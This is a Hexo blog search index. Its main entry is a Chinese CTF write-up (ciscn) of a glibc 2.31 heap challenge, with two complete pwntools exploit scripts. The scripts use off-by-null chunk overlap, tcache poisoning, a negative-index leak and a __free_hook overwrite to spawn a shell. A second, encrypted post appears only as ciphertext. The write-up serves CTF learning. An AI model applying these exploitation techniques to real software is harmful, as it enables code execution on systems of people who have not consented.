<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>关于没做出来的这个pwn</title>
    <link href="/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/"/>
    <url>/2022/06/30/%E5%85%B3%E4%BA%8E%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5%E7%9A%84%E8%BF%99%E4%B8%AApwn/</url>
    
    <content type="html"><![CDATA[<h2 id="感想"><a class="header-anchor" href="#感想">¶</a>感想</h2><p>我感觉我像个傻子，，，，</p><img src="https://i.bmp.ovh/imgs/2022/06/30/60e48556559e2748.png" style="zoom: 67%;" /><p>有些人真的是有点瞎呢，这么明显的一个off_by_NULL，没看出来。。。。</p><p>然后就是overlap的寻常思路，注意2.31下的idx检查。。。。</p><p>虽然但是，2.31属实还是花了我很多时间，很久没刷题还是有很多缺点。</p><p>首先是leak，本来是很简单的，直接打chunk到unsorted bin然后拿出来再leak就行了。但是莫名奇妙，拿出来就不对了。</p><p>然后还是调试最后leak了出来，不知道为啥。</p><img src="https://i.bmp.ovh/imgs/2022/06/30/9cf9355702462588.png" style="zoom:50%;" /><p>然后就是overlap+劫持了。</p><p>这里我谨慎了一波，看了一下许久未看的libc保护机制，2.31下free会检查tcache的key，同时off_by_NULL合并的时候会检查presize和presize§</p><p>这让我想起了很久之前的一篇笔记，这里单拿出来，唠一唠</p><h2 id="高版本的off-by-one"><a class="header-anchor" href="#高版本的off-by-one">¶</a>高版本的off_by_one</h2><p><a href="https://zhuanlan.zhihu.com/p/136983333%E5%8F%AF%E4%BB%A5%E5%9C%A8%E8%BF%99%E9%87%8C%E7%9C%8B2.31%E5%92%8C2.29%E4%BB%A5%E5%90%8E%E7%9A%84%E6%A3%80%E6%9F%A5">https://zhuanlan.zhihu.com/p/136983333可以在这里看2.31和2.29以后的检查</a></p><p>2.29以后就给chunk的unlink加了presize的检查，这就让原来随意利用的off_by_NULL变得不是那么简单，因为size控制不了（除了溢出）这是众所周知的，所以在寻常的unlink上 ，这里多转了一个弯，他既然检查了size和presize，那么我直接在chunk里面伪造一个chunk，那这个fake_chunk的size不就可以控制了吗。</p><p>如此虽然让后面的劫持复杂了1%，但是还是非常好控制的。</p><p>此外由于此处的是伪造chunk，所以必须还要满足一个要求。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        \     <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>fd和bk要合法，因为默认该chunk是在unsorted bin里面的，以前直接free打进去不需要考虑这个，此时伪造则需要考虑。</p><p>一个简单的方法就是fd和bk都指向自己即可。这样就满足了。</p><p>于是就有了以下的做法。</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/c37768e718d638f6.png" alt=""></p><p>以后的步骤不详细写了，，看exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># io=remote("10.75.1.25",58011)</span><span class="token comment">#io= process("./pwn",env=&#123;"LD_PRELOAD":"./libc.so.6"&#125;)</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token comment"># attach(p)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#put into tcache</span>    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7a0</span><span class="token keyword">print</span> <span class="token string">"heap_addr:"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span>j<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x100</span> <span class="token operator">-</span> <span class="token number">592</span> <span class="token operator">-</span> <span class="token number">0x1ecb80</span><span class="token keyword">print</span> <span class="token string">"libc_base=>"</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>free<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1f1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x9a0</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1f0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token comment"># pause()</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 uaf</span>free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#key</span>edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#0</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#9 freehook</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="非预期"><a class="header-anchor" href="#非预期">¶</a>非预期</h2><p>这个是重点，当时比赛我就只找到了这个非预期的洞，常见的一个index负溢出，对这个比较敏感，所以当时没看别的洞，这里记录一下是因为，好几次都是这样类型的洞，我都没打出来，因为bss段上的负溢出实在想不出有什么leak的方式，直到这次看到了ayaka师傅的wp，问了一首ayaka，才知道有些东西编译就会带有，所以这里记录一下。</p><p><img src="https://i.bmp.ovh/imgs/2022/07/01/cbdf367cd2911642.png" alt=""></p><p>闭着眼睛打了一场比赛，貌似15名还不错呢，还有个pwn3血 🙂</p><p>服了，这么明显，，，不过也是记住了。。。</p><p>思路就是leak出这个地址，然后根据基址写一个got表地址到这里，然后再leak libc地址，然后直接写hook即可。</p><p>写hook也是一样的思路，先把hook写到上面，然后覆盖即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token comment"># libc = ELF("./libc.so.6")</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Idx: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Size: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content: "</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span>bss <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"bss: 0x%x"</span><span class="token punctuation">,</span> bss<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss<span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\nDone'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ec980</span><span class="token comment">#stdin</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_addr: 0x%x'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token comment"># libc.address = libc_base</span>poc <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>poc <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">,</span>poc<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>没做出来。。。惭愧惭愧</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ciscn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Arch-linux记录</title>
    <link href="/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/06/30/Arch-linux%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3804e55f75da1bcdf81aae3394f451ef10a220ed38e9c06c16cc567163dac29e">cc0c0f8ba411acd26894e584ac9b5fda4c48279772446ae3a79194e70ba82a6e254b09a770c602c31392fb984500b111dce6dc9d27525b8bed2d8ecce07c55d7d23864cf85ca7b833bf37adda3708ef5a66ccd531414ca2f889dc61f3067d9b4d534cb5755c491c7d67190a1b41e018d4f8deb64c79f16a548f387491f84d0fa4c481c967f9d949bd2287e57f6da405062fd417396e13a2d5998f61d8c150cc61f1a57a2cecd52156617596dd26a6b9b03c2bdd36fe87b5a7c1ad859cff65c8bd07475685aeefba80e0aa2e7793fe64ba1d200eaa038a1679a0fd9f3250be51847e869b6ed8fe8048c7be14e3caf21d0327a9fbad92302e96808a8d4c6dabef330757080a7986a9240576a57a2ed1707cf45cfd41b3676096d2b2a50700deef48f6bc626e05f3a7273c4326e85dae4d2c9f56958486a2b3058406d28b810939bcdcbac065a891908e38d2a16905cb9e73cddaf76cdd73012f99fa76554616c07c2920ea1cbeaf45cccc3bf9e1ae02d1756a48e40e75aa336025288ba8496656e2f14595c7369515bca9bdb4214e2901d7f55cb247a31a0e15f62c94a044d8d06480fdb8b6e874a3bda907aa814691dc2f00531cbabcc38f024128276dd44656610b572d748771e34a7f8e58e2d4eca3f8b1922c6b2b01bc66046b0b69bf584237eb907af46cd9d41a228163aa56308d006b32e3eb0beda3a9c1d4bce624769747f8cc9433943658480098764dbac021b3406419927c87adf58560ad8343749a067cb617052e723e9ba8e327505f3d227e5de82613d88b45291d96d0200c62632bd47a555b0fad1351f34588f4ea2585ac34ea36d3dfc38406ac56c4f234059061ae1c6cc680b4f783852ff700a9d27e7b17fd8b7316cdc95332f50d2d9ce868ca69c3984b8fc369082ef8e74d0da2b2c6c7a86a042eca284f288e9be0b2f4618dfaf887e5ab365113e846b76502a9aabbe5f219bc4384c720c0f54f71acfc3bb22f1fd044d20b79ba6a2ccd120d9f24604c599a6c77e6d45b646a2ebe60cde4d63d330a0b3738e2d3c4c8caae282bee66be2f807adbd2e8d7ebf64ba2cdd993412bec3039a0693014f9d94420462fdd1336c77cef13cb05591aad35759bf5f16462ea1454575028fea221af5bdc988379a6c7631afe3ef5003461b11b4a3282e7e5c2622acca369f847e4a44df5e5c936fd1b47bd48a151b58e1963f77b9a8186efbf19816f865c139d3cecba541095af2f3baba8ae58407c6aae1f06edda62fc3b6310141fcca41fdad5183a514e2b2321a4aea3a6329904b92dc13ade29df06a19bc9e1f1ab1546483577eb4726f9a7e6aa3be8d6a4fc5cee096dd8b1f89d4c95dde41c547a42bbd2484eb94a287deb0466442a295a41865a3b3f304b32eb0792e94baf78fe90187af159c2102e6106ebef2e6b200a6e1f19103f96677c4acde80872b4b6acfbbb0fe445a2607e4032e451c16754e6e48f8c47ea3407258897e0d63dad24db300dc6d628a70d365b64c74df77d5446b44c7e95011cfa217939381e760836a39feee3cc60925bb6aaf8111ba44828643d37891e8d55f2394d4073f9a95916a6d049c0492ffd50618a11102e3b6814426c5c22c8440df60baa900907d760bf1955cbb398c07bbf58a32df44df8ccb7f4e296e2d8ea8a4b2c8133dd6f6ea4b828aac7897d39c42be41a802e40c6370cbf647bef3da56b47ae218135c4883e171db9846a6b0b74ff932bb94078043daf05450d9c00faaf6fbfa550e2725f1c570446bb28b39bac2e42ede3d7e489ff50b014dc8d677836fdd860f7bebbaebf3281b8702472d8ff7438e904d3cb6a39db30b4bff32a0fd9ee74f87b57f462a5eb479daba0a8aac40b71530a06806a2eb9a9390b7de672532231eaacca1eb2fc85542c1ddff8fbf1eb79f8ca10c0564ce5ab52638237f5e35abe7b848dcb2d85a1ffa9246f231e4cccad08f87e3719fb9cac566a624b1fb60f35087b3d8e99b3a07627c938a9338dab1ca6300daf02aa87dd7e7d85def8e977cee9c7587a99dda366bb2ac0f1887381a0cd066d3402be2a2fc40d556e5f566b6c49db0617b9987661c749f564c703b4c9653bc49d4a811b7d43484b26081f856882a7c1309e3e3f6d3dfacc8750796124792784d81fcf7fcf7423ea315396906f64a71f380fd2581edb0f62d844fc9e5665a8c812f426805ab7c4d1b68835f9118219df3f84c2bcbefad8edf60e704f0f9706432ea4714b1e63e7bacfbf57382ffd8f02d3461c1459201c23e441d86e93bfc3b6eb1fb6cc14c1071a960d8ff9716c0c9c66322439053465a36e8b185a5b7bbb8abb90d0d166edc501d5bd4fa7da2535c88ced9c3778fd738ee232425a5d90f7ec5e5e64a8ca494c84de7925c51a7e74115a5772f9f51d2482ef5b965f1f4c57afb897968763a9e19ca93bc4d62d50154cc4d9f1cf5c356d1925199f826275338d078580199a4e669897d1fd425d0070c6f83fba9072dc19e0e78e077505f38539e672ec75e84bd9796266b422374dc17e4de9cb2101c5c063d0bdb78b9ea018caa6304a0dbc2e45f1ea515216101bde5ed094bdcdf5807d72bcfa68542c50c49fb756052db88124f03a316b7ac2